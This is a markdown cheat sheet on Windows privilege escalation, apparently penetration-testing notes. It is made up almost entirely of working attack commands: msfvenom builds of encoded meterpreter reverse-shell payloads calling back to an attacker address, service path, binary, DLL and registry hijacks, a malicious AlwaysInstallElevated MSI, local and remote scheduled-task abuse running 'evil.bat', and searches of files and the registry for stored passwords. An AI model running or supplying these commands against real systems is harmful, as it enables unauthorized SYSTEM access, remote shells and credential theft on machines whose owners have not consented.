# Windows Privilege Escalation

- [Automated Scripts](#automated-scripts)
- [Get OS Version and Patch Level](#get-os-version-and-patch-level)
- [Unquoted Service Paths](#unquoted-service-paths)
- [Weak File and Folder Permissions per drive](#weak-file-and-folder-permissions-per-drive)
- [Weak Service Permissions](#weak-service-permissions)
- [Weak Registry Keys Permissions](weak-registry-keys-permissions)
- [AlwaysInstallElevated](#always-install-elevated)
- [Scheduled Tasks](#scheduled-tasks)
- [Create Local Task](#create-local-task)
- [Create Remote Task](#create-remote-task)
- [Stored Credentials](#stored-credentials)
- [Accessibility](#accessibility)





## Automated Scripts
     PowerUp
     Windows Privesc Check 2.0

## Get OS Version and Patch Level

     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
     wmic qfe get Caption,Description,HotFixID,InstalledOn

## Unquoted Service Paths

     wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

     Service Path Hijack

     msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Privatefirewall.exe
     sc stop PFNet
     sc start PFNet

## Weak File and Folder Permissions per drive

     accesschk.exe -uwdqs "Authenticated Users" c:\
     accesschk.exe -uwqs Users c:\*.*
     accesschk.exe -uwqs "Authenticated Users" c:\*.*

     Modify Service Binary

     msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Privatefirewall.exe

     DLL Hijacking – non-default directories in C: give write access to authenticated users
     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$ip LPORT=8989 -f dll > hijackable.dll
     cp dll into directory
     shutdown /r /t 0

     Windows (32 bit) first searches for "known DLLs", such as Kernel32.dll and User32.dll, then it searches:
1 - The directory from which the application loaded
2 - 32-bit System directory (C:\Windows\System32)
3 - 16-bit System directory (C:\Windows\System)
4 - Windows directory (C:\Windows)
5 - The current working directory (CWD)
6 - Directories in the PATH environment variable (system then user)

## Weak Service Permissions

     accesschk.exe -uwcqv "testuser" * /accepteula
     accesschk.exe –uwcqv “Authenticated Users” *

     Modify Service BinPath

     Accesschk.exe –ucqv <service-name>
     sc qc <service-name>
     msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o new-service.exe
     sc config PFNET binpath= "new-service.exe"
     sc stop PFNET
     sc start PFNET

     SERVICE_CHANGE_CONFIG Can reconfigure service binary
     WRITE_DAC Can reconfigure permissions à SERVICE_CHANGE_CONFIG
     WRITE_OWNER Can become owner à reconfigure permissions
     GENERIC_WRITE Inherits SERVICE_CHANGE_CONFIG
     GENERIC_ALL Inherits SERVICE_CHANGE_CONFIG

## Weak Registry Keys Permissions

     subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
     https://www.microsoft.com/en-us/download/details.aspx?id=23510

     Modify Registry Key
     msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Payload.exe
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d      "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
     shutdown /r /t 0

## AlwaysInstallElevated 

     Registry Keys (both reg values must be 1)
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

     AlwaysInstallElevated - allows users of any privilege level to install *.msi files as NT AUTHORITY\SYSTEM
     msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Payload.exe
     msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > malicious.msi
     upload payload and msi
     use exploit/multi/handler
     msiexec /quiet /qn /i malicious.msi

## Scheduled Tasks

     schtasks /query /fo LIST /v
     accesschk.exe -dqv "E:\GrabLogs"

     Task Hijacking

     Look for tasks running under SYSTEM
     msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Privatefirewall.exe
     Overwrite executable

## Create Local Task (must be Local Admin on 2000, XP, 2003)
     msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=$ip LPORT=443 -f exe -o Payload.exe
     net start "Task Scheduler"
     time
     start handler
     at 06:42 /interactive "C:\Payload.exe"
     schtasks /create /tn newtask /s bob /u john /p password /sc once /st 18:51 /tr "C:\Payload.exe"

## Create Remote Task
     net use \\$ip /user:DOMAIN\username password
     net time \\$ip
     at \\$ip 13:20 c:\temp\evil.bat

## Stored Credentials

     dir /s *pass* == *cred* == *vnc* == *.config*
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s
     dir c:\*vnc.ini /s /b /c
     dir c:\*ultravnc.ini /s /b /c
     dir c:\ /s /b /c | findstr /si *vnc.ini
     findstr /si password *.txt | *.xml | *.ini
     findstr /si pass *.txt | *.xml | *.ini

     Unattended Installs

     Look for sysprep.inf, sysprep.xml, Unattended.xml
     C:\Windows\Panther\
     C:\Windows\Panther\Unattend\
     C:\Windows\System32\
     C:\Windows\System32\sysprep\

## Accessibility
     sethc.exe          Shift x 5
     utilman.exe      Windows + C

